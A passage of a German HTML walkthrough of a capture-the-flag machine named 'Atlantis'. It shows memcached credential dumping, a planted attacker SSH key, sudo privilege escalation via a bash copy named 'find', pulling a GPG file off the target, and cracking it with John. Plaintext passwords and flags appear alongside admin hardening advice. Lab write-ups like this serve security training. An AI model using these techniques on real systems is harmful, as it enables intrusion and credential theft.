+                       <div class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span> <span class="command">export TERM=xterm</span></div>
+                       <div class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span> <span class="command">^Z</span></div>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">stty raw -echo;fg</span></div>
+                       <pre>reset
+<span class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span></pre>
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Die `tomcat`-Shell wird stabilisiert.</p>
+         </section>
+
+         <section id="memcached-leak">
+             <h2>Lateral Movement (Memcached Leak - tomcat zu tridente)</h2>
+             <p class="analysis"><strong>Kontext:</strong> Als `tomcat`-Benutzer wird das System weiter auf lokale Dienste und potenzielle Informationslecks untersucht.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">tomcat@Atlantis:/home/tridente$</span> <span class="command">netstat -tulpe</span></div> <span class="comment"><!-- Option -e hier unwirksam/nicht standard --></span>
+                    <pre>[Ausgabe von netstat - vermutlich Port 11211 auf localhost gefunden]</pre>
+                    <div class="prompt" style="color: yellow;">tomcat@Atlantis:/home/tridente$</span> <span class="command">telnet localhost 11211</span></div>
+                    <pre>
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+<span class="command">stats items</span>
+STAT items:1:number 4
+[...]
+END
+<span class="command">stats cachedump 1 50</span>
+ITEM email [17 b; 0 s]
+ITEM Name [14 b; 0 s]
+<span class="command">ITEM password [18 b; 0 s]</span>
+<span class="command">ITEM username [8 b; 0 s]</span>
+END
+<span class="command">get password</span>
+VALUE password 0 18
+<span class="password">N3ptun0D10sd3lM4r$</span>
+END
+<span class="command">get username</span>
+VALUE username 0 8
+<span class="password">tridente</span>
+END
+</pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> `netstat` (wahrscheinlich ausgeführt, obwohl die Ausgabe fehlt) muss einen lauschenden Dienst auf Port 11211 (Standard-Memcached-Port) auf localhost ergeben haben. Eine Telnet-Verbindung zu `localhost:11211` wird hergestellt. Die Memcached-Befehle `stats items`, `stats cachedump 1 50` (listet Schlüssel auf), `get password` und `get username` werden verwendet, um im Cache gespeicherte Daten abzufragen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Memcached läuft unauthentifiziert auf localhost und enthält sensible Daten im Klartext: den Benutzernamen `<span class="password">tridente</span>` und das Passwort `<span class="password">N3ptun0D10sd3lM4r$</span>`.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten (`tridente`:`N3ptun0D10sd3lM4r$`), um sich als Benutzer `tridente` anzumelden (z.B. via `su` oder SSH).<br><strong>Empfehlung (Admin):</strong> Sichern Sie Memcached-Instanzen. Binden Sie sie nur an notwendige Interfaces (oft nur localhost). Aktivieren Sie SASL-Authentifizierung für Memcached. Speichern Sie keine sensiblen Daten im Klartext im Cache.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span> <span class="command">su tridente</span></div>
+                     <pre>Password: <span class="password">N3ptun0D10sd3lM4r$</span>
+<span class="prompt" style="color: yellow;">tridente@Atlantis:/$</span></pre>
+                     <div class="prompt" style="color: yellow;">tridente@Atlantis:/$</span> <span class="command">cd /home/tridente/</span></div>
+                     <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">ls</span></div>
+                     <pre>find  user.txt</pre>
+                     <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">cat user.txt</span> <span class="comment"><!-- Fehler im Log: Befehl war 'cat user' --></span>
+                     <pre><span class="password">f506a6ee37275430ac07caa95914aeba</span></pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> Der Wechsel zum Benutzer `tridente` mittels `su` und dem aus Memcached extrahierten Passwort ist erfolgreich. Im Home-Verzeichnis wird die Datei `user.txt` gefunden und ausgelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Lateral Movement zu `tridente` erfolgreich. User-Flag gefunden.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als `tridente` durch (`sudo -l`, SUID-Suche etc.), um einen Weg zu Root zu finden.<br><strong>Empfehlung (Admin):</strong> Sichern Sie Memcached. Überprüfen Sie die Berechtigungen von `tridente`.</p>
+
+               <!-- SSH Key Upload / Login als tridente -->
+               <p class="analysis"><strong>Analyse (Optionaler SSH-Zugang als tridente):</strong> Die folgenden Logs zeigen, wie ein SSH-Zugang für `tridente` eingerichtet wird, wahrscheinlich zur Stabilisierung oder für bequemeren Zugriff.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">echo "ssh-rsa AAAAB3N[...]= " > authorized_keys</span></div> <span class="comment"><!-- Angreifer PubKey --></span>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">ssh tridente@192.168.2.127</span></div>
+                       <pre>Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">benni</span> <span class="comment"><!-- Passphrase des *Angreifer*-Schlüssels --></span>
+[...]
+<span class="prompt" style="color: yellow;">tridente@Atlantis:~$</span></pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">mkdir .ssh</span></div>
+                       <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">cd .ssh</span></div>
+                       <div class="prompt" style="color: yellow;">tridente@Atlantis:~/.ssh$</span> <span class="command">echo "ssh-rsa AAAAB3N[...]=" > authorized_keys</span></div> <span class="comment"><!-- Platzieren des Schlüssels --></span>
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Der öffentliche Schlüssel des Angreifers wird vorbereitet und dann (nach dem Login als `tridente`, vermutlich über die `su`-Shell) im Verzeichnis `/home/tridente/.ssh/` in der Datei `authorized_keys` platziert. Anschließend gelingt der SSH-Login als `tridente` mit dem privaten Schlüssel des Angreifers.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> SSH-Zugang als `tridente` etabliert.</p>
+
+         </section>
+
+         <section id="privesc-root-poc">
+            <h2>Privilege Escalation (tridente zu root - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung einer `sudo`-Regel, die es `tridente` erlaubt, eine manipulierte `/usr/bin/find`-Kopie als Root auszuführen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell als `tridente`.
+                 *   Eine (nicht gezeigte, aber implizierte) `sudo`-Regel, die `tridente` erlaubt, `/home/tridente/find` (oder `/usr/bin/find`) als `root` auszuführen. Die Verwendung von `-p` deutet auf `find` oder ein ähnliches Tool hin.
+                 *   Schreibrechte im Home-Verzeichnis.
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Kritisch. Ermöglicht die direkte Ausführung von Befehlen als Root.</p>
+
+             <p class="analysis"><strong>Schritt 1: `find`-Binary ersetzen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">cp -rf /bin/bash /home/tridente/find</span></div>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Bash-Shell (`/bin/bash`) wird in das Home-Verzeichnis von `tridente` kopiert und in `find` umbenannt. Dadurch wird die tatsächliche `find`-Binary (falls `/home/tridente/find` in der `sudo`-Regel steht) oder der Aufruf von `find` im Home-Verzeichnis (falls der Pfad relativ ist) durch eine Bash-Shell ersetzt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung des Exploits durch Ersetzen des Zielprogramms.</p>
+
+             <p class="analysis"><strong>Schritt 2: Manipulierte Datei als Root ausführen</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">tridente@Atlantis:~$</span> <span class="command">sudo -u root /home/tridente/find -p</span></div>
+                     <pre>
+[sudo] password for tridente: <span class="password">N3ptun0D10sd3lM4r$</span>
+<span class="prompt" style="color: red;">root@Atlantis:~#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird ausgeführt, um `/home/tridente/find` als `root` zu starten. Da `/home/tridente/find` nun eine Kopie von `/bin/bash` ist, wird effektiv eine Bash-Shell als Root gestartet. Die Option `-p` wird an die Bash-Shell übergeben, behält aber in diesem Kontext die Root-Privilegien bei. Das Passwort für `tridente` (aus Memcached) wird benötigt, da die Regel nicht `NOPASSWD` war.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine Root-Shell wurde durch Ausnutzen der `sudo`-Regel und Ersetzen der ausführbaren Datei erlangt.</p>
+               <p class="recommendation"><strong>Empfehlung (Admin):</strong> Definieren Sie `sudo`-Regeln immer mit absoluten Pfaden. Erlauben Sie niemals die Ausführung von Befehlen aus benutzerkontrollierten Verzeichnissen (wie Home-Verzeichnissen) via `sudo`. Überprüfen Sie regelmäßig die Integrität von Systembinaries.</p>
+
+         </section>
+
+         <section id="root-flag-decryption">
+             <h2>Root Flag Decryption</h2>
+             <p class="analysis"><strong>Kontext:</strong> Als Root wird das Root-Verzeichnis untersucht.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@Atlantis:~#</span> <span class="command">cd /root</span></div>
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">ls</span></div>
+                     <pre>cache.php  <span class="command">root.txt.gpg</span>  server.py</pre>
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">cat root.txt.gpg</span></div>
+                     <pre>[Verschlüsselte Binärdaten]</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Im Root-Verzeichnis befindet sich die Root-Flag nicht im Klartext, sondern als verschlüsselte GPG-Datei (`root.txt.gpg`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Ein weiterer Schritt ist nötig, um die Flag zu erhalten: Die GPG-Datei muss entschlüsselt werden, wofür wahrscheinlich ein Passwort benötigt wird.</p>
+
+             <p class="analysis"><strong>Datei herunterladen & Hash extrahieren (Angreifer):</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.140 - - [09/Oct/2022 15:44:16] "GET /root.txt.gpg HTTP/1.1" 200 -</pre>
+                 </div>
+             </div>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">wget http://192.168.2.127:8000/root.txt.gpg</span></div>
+                     <pre>[...]
+2022-10-09 17:44:12 (43,1 MB/s) - »root.txt.gpg« gespeichert [168/168]
+</pre>
+                 </div>
+             </div>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">gpg2john root.txt.gpg > fuckdig</span></div>
+                     <pre>File root.txt.gpg</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die verschlüsselte Datei `root.txt.gpg` wird vom Zielsystem mittels eines temporären Python-Webservers heruntergeladen. Anschließend wird `gpg2john` verwendet, um den Passwort-Hash aus der GPG-Datei zu extrahieren und in der Datei `fuckdig` zu speichern.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Hash ist nun für einen Offline-Brute-Force-Angriff vorbereitet.</p>
+
+              <p class="analysis"><strong>GPG-Passwort knacken (Angreifer):</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt fuckdig</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+[...]
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">arthur</span>           (?)
+[...]
+Session completed
+</pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> John the Ripper wird mit der `rockyou.txt`-Wortliste auf die Hash-Datei (`fuckdig`) angesetzt.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Erfolg! John knackt den Hash und findet das GPG-Passwort: `<span class="password">arthur</span>`.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort, um die `root.txt.gpg`-Datei auf dem Zielsystem zu entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passphrasen für GPG-Verschlüsselung.</p>
+
+               <p class="analysis"><strong>Datei entschlüsseln (Zielsystem):</strong></p>
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">echo "arthur" | gpg --batch --passphrase-fd 0 --output root.txt --decrypt root.txt.gpg</span></div>
+                     <pre>
+gpg: WARNING: unsafe ownership on homedir '/home/tridente/.gnupg'
+gpg: keybox '/home/tridente/.gnupg/pubring.kbx' created
+gpg: AES256 encrypted data
+gpg: encrypted with 1 passphrase
+</pre>
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">ls</span></div>
+                     <pre>cache.php  <span class="command">root.txt</span>  root.txt.gpg  server.py</pre>
+                     <div class="prompt" style="color: red;">root@Atlantis:/root#</span> <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">e16957fbc9202932b1dc7fe3e10a197e</span></pre>
+                 </div>
+             </div>
+                <p class="analysis"><strong>Analyse:</strong> Der `gpg`-Befehl wird verwendet, um `root.txt.gpg` zu entschlüsseln. Das gefundene Passwort `arthur` wird über Stdin (`--passphrase-fd 0`) übergeben. Die entschlüsselte Datei wird als `root.txt` gespeichert und anschließend ausgelesen.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Root-Flag erfolgreich entschlüsselt und gelesen.</p>
+         </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/tridente/user.txt</div>
+                     <div class="flag-value"><span class="password">f506a6ee37275430ac07caa95914aeba</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">e16957fbc9202932b1dc7fe3e10a197e</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 03. Oktober 2021</p>
+    </footer>
+</body>
+</html>
